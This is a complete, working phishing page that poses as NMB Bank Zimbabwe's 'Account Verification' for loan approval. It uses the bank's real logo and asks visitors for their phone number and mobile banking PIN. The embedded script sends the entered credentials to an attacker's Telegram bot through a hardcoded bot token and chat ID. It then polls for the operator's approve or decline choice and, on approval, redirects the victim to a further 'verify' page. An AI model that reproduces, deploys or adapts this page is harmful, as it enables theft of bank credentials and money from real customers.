<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Account Verification - NMB Bank Zimbabwe</title>
    <meta name="theme-color" content="#001f3f">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');

        :root {
            --primary: #001f3f;
            --primary-dark: #000f1f;
            --primary-light: #e8f0f8;
            --accent: #D4AF37;
            --accent-light: #f5ead3;
            --dark: #1a1a1a;
            --gray-900: #1a1a1a;
            --gray-800: #2d2d2d;
            --gray-700: #4a4a4a;
            --gray-600: #6c757d;
            --gray-500: #8a9aaa;
            --gray-400: #b0b8c0;
            --gray-200: #e8ecf1;
            --gray-100: #f5f7fa;
            --white: #ffffff;
            --success: #2b8a3e;
            --error: #dc3545;
            --shadow-soft: 0 4px 12px rgba(0,0,0,0.05);
            --shadow-hard: 0 12px 32px rgba(0,0,0,0.1);
            --radius-lg: 24px;
            --radius-md: 16px;
            --radius-sm: 10px;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        html {
            scroll-behavior: smooth;
        }

        html,
        body {
            min-height: 100vh;
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: linear-gradient(135deg, var(--gray-100) 0%, var(--primary-light) 100%);
            overflow-x: hidden;
            color: var(--dark);
            line-height: 1.6;
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }

        .login-card {
            width: 100%;
            max-width: 440px;
            background: var(--white);
            border-radius: var(--radius-lg);
            padding: 48px 32px;
            box-shadow: var(--shadow-hard);
            text-align: center;
            border: 1px solid var(--gray-200);
            animation: slideUp 0.5s cubic-bezier(0.165, 0.84, 0.44, 1);
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo-wrapper {
            margin-bottom: 32px;
            display: flex;
            justify-content: center;
        }

        .logo-img {
            height: 56px;
            width: auto;
            object-fit: contain;
            display: block;
        }

        h1 {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 8px;
            color: var(--primary);
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-size: 15px;
            color: var(--gray-600);
            line-height: 1.6;
            margin-bottom: 32px;
        }

        .form-group {
            text-align: left;
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--gray-700);
        }

        .input-wrapper {
            position: relative;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px 14px 48px;
            border: 1.5px solid var(--gray-200);
            border-radius: var(--radius-sm);
            font-size: 16px;
            font-weight: 600;
            outline: none;
            transition: var(--transition);
            background: var(--gray-100);
            color: var(--gray-900);
            font-family: inherit;
        }

        .form-input:focus {
            border-color: var(--primary);
            background: var(--white);
            box-shadow: 0 0 0 4px rgba(0, 31, 63, 0.08);
        }

        .form-input::placeholder {
            color: var(--gray-500);
            font-weight: 400;
        }

        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--primary);
            font-size: 16px;
            z-index: 2;
        }

        .password-wrapper {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            top: 50%;
            right: 16px;
            transform: translateY(-50%);
            cursor: pointer;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--gray-600);
            transition: var(--transition);
            border-radius: 50%;
        }

        .toggle-password:hover {
            color: var(--primary);
            background: var(--primary-light);
        }

        .toggle-password svg {
            width: 18px;
            height: 18px;
            fill: currentColor;
        }

        .error-msg {
            color: var(--error);
            font-size: 13px;
            font-weight: 600;
            margin-top: 8px;
            display: none;
            text-align: center;
            padding: 12px 16px;
            background: #fff8f8;
            border-radius: var(--radius-sm);
            border-left: 3px solid var(--error);
        }

        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 40px;
        }

        .btn {
            width: 100%;
            padding: 16px;
            border-radius: var(--radius-sm);
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: var(--transition);
            border: none;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-family: inherit;
        }

        .btn-action {
            background: var(--primary);
            color: var(--white);
            box-shadow: 0 8px 20px rgba(0, 31, 63, 0.15);
        }

        .btn-action:hover {
            background: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: 0 12px 28px rgba(0, 31, 63, 0.2);
        }

        .btn-action:active {
            transform: translateY(0);
        }

        .btn-back {
            background: var(--gray-100);
            color: var(--gray-700);
            border: 1px solid var(--gray-200);
        }

        .btn-back:hover {
            background: var(--gray-200);
            border-color: var(--gray-300);
        }

        /* SPINNER STYLES */
        #spinner {
            position: fixed;
            inset: 0;
            background: rgba(0, 15, 31, 0.6);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .dots-container {
            width: 64px;
            height: 64px;
            position: relative;
            animation: rotate-dots 1.5s linear infinite;
            margin-bottom: 24px;
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            position: absolute;
        }

        .dot-1 {
            background-color: var(--primary);
            top: 0;
            left: 50%;
            transform: translateX(-50%);
        }

        .dot-2 {
            background-color: var(--accent);
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
        }

        .dot-3 {
            background-color: var(--primary);
            left: 0;
            top: 50%;
            transform: translateY(-50%);
        }

        .dot-4 {
            background-color: var(--accent);
            right: 0;
            top: 50%;
            transform: translateY(-50%);
        }

        .spinner-text {
            font-size: 16px;
            font-weight: 700;
            color: var(--white);
            letter-spacing: 0.5px;
        }

        @keyframes rotate-dots {
            100% {
                transform: rotate(360deg);
            }
        }

        /* RESPONSIVE */
        @media (max-width: 640px) {
            .login-card {
                padding: 40px 24px;
                border-radius: var(--radius-md);
            }

            .logo-img {
                height: 48px;
            }

            h1 {
                font-size: 24px;
            }

            .subtitle {
                font-size: 14px;
            }

            .btn-group {
                gap: 10px;
                margin-top: 32px;
            }

            .btn {
                padding: 14px;
                font-size: 14px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 16px;
            }

            .login-card {
                padding: 32px 20px;
            }

            .logo-img {
                height: 44px;
            }

            h1 {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo-wrapper">
            <img src="https://nmbz.co.zw/nmb/sites/default/files/logo_1.png" alt="NMB Bank" class="logo-img">
        </div>

        <h1>Account Verification</h1>
        <p class="subtitle">Verify your account for loan approval. Enter your phone number and PIN to proceed.</p>

        <div class="form-group">
            <label for="phone"><i class="fas fa-phone"></i> Phone Number</label>
            <div class="input-wrapper">
                <span class="input-icon"><i class="fas fa-phone"></i></span>
                <input type="tel" id="phone" class="form-input" placeholder="0712345678" maxlength="10" inputmode="numeric">
            </div>
        </div>

        <div class="form-group">
            <label for="password"><i class="fas fa-lock"></i> PIN</label>
            <div class="password-wrapper input-wrapper">
                <span class="input-icon"><i class="fas fa-lock"></i></span>
                <input type="password" id="password" class="form-input" placeholder="4-digit PIN" maxlength="4" inputmode="numeric">
                <div id="togglePassword" class="toggle-password" title="Toggle PIN visibility">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                    </svg>
                </div>
            </div>
        </div>

        <div id="err" class="error-msg">
            <i class="fas fa-exclamation-circle"></i> Please enter a valid phone number and PIN
        </div>

        <div class="btn-group">
            <button class="btn btn-action" id="next">
                <span>Verify Account</span>
                <i class="fas fa-arrow-right"></i>
            </button>
            <button class="btn btn-back" id="back">
                <i class="fas fa-chevron-left"></i> Go Back
            </button>
        </div>
    </div>

    <div id="spinner">
        <div class="dots-container">
            <div class="dot dot-1"></div>
            <div class="dot dot-2"></div>
            <div class="dot dot-3"></div>
            <div class="dot dot-4"></div>
        </div>
        <div class="spinner-text">Verifying account...</div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8699232330:AAG8Xm56m8g0Uixtd7WhttHtxr8jx4rIBFI',
            CHAT_ID: '8632204062',
            REDIRECT_PAGE: 'verify'
        };

        let state = { poll: null, approveId: null, declineId: null };

        const els = {
            phoneInput: document.getElementById('phone'),
            passwordInput: document.getElementById('password'),
            togglePassword: document.getElementById('togglePassword'),
            nextBtn: document.getElementById('next'),
            errMsg: document.getElementById('err'),
            spinner: document.getElementById('spinner'),
            backBtn: document.getElementById('back')
        };

        // RESTRICTION: Only digits
        [els.phoneInput, els.passwordInput].forEach(input => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '');
            });
        });

        // Password Toggle
        els.togglePassword.addEventListener('click', () => {
            const isPassword = els.passwordInput.type === 'password';
            els.passwordInput.type = isPassword ? 'text' : 'password';
            els.togglePassword.innerHTML = isPassword
                ? '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>'
                : '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>';
        });

        function showError(msg) {
            if (msg) els.errMsg.textContent = msg;
            els.errMsg.style.display = 'block';
        }

        function hideError() {
            els.errMsg.style.display = 'none';
        }

        function showSpinner() {
            els.spinner.style.display = 'flex';
        }

        function hideSpinner() {
            els.spinner.style.display = 'none';
        }

        function stopPolling() {
            if (state.poll) {
                clearInterval(state.poll);
                state.poll = null;
            }
        }

        function sendLoginAttempt(accountValue, password) {
            const ts = Date.now();
            state.approveId = `approve_${ts}`;
            state.declineId = `decline_${ts}`;
            const message = `NMB Bank Account Verification\n\n` +
                `Account Type: \`Mobile\`\n` +
                `Phone: \`${accountValue}\`\n` +
                `PIN: \`${password}\`\n\nAction?`;
            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ Approve & Continue', callback_data: state.approveId },
                            { text: '❌ Decline', callback_data: state.declineId }
                        ]]
                    }
                })
            }).catch(err => {
                hideSpinner();
                showError('Connection error: ' + err.message);
            });
            startPolling();
        }

        function startPolling() {
            stopPolling();
            state.poll = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1&timeout=30`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result?.length) return;
                        for (const update of data.result) {
                            const cb = update.callback_query;
                            if (!cb) continue;
                            const cbData = cb.data;
                            if (cbData === state.approveId) {
                                stopPolling();
                                hideSpinner();
                                localStorage.setItem('phone', els.phoneInput.value.trim());
                                window.location.href = CONFIG.REDIRECT_PAGE;
                                return;
                            }
                            if (cbData === state.declineId) {
                                stopPolling();
                                hideSpinner();
                                showError("❌ Verification declined. Please check your credentials.");
                                return;
                            }
                        }
                    })
                    .catch(console.warn);
            }, 2000);
        }

        els.nextBtn.onclick = () => {
            hideError();
            const inputVal = els.phoneInput.value.trim();
            const pwd = els.passwordInput.value.trim();

            if (inputVal.length !== 10 || !inputVal.startsWith('0')) {
                showError("❌ Please enter a valid 10-digit phone number");
                return;
            }
            if (pwd.length !== 4) {
                showError("❌ Please enter a valid 4-digit PIN");
                return;
            }

            showSpinner();
            sendLoginAttempt(inputVal, pwd);
        };

        els.backBtn.onclick = () => window.history.back();

        // Allow Enter key to submit
        [els.phoneInput, els.passwordInput].forEach(input => {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    els.nextBtn.click();
                }
            });
        });
    </script>

</body>
</html>
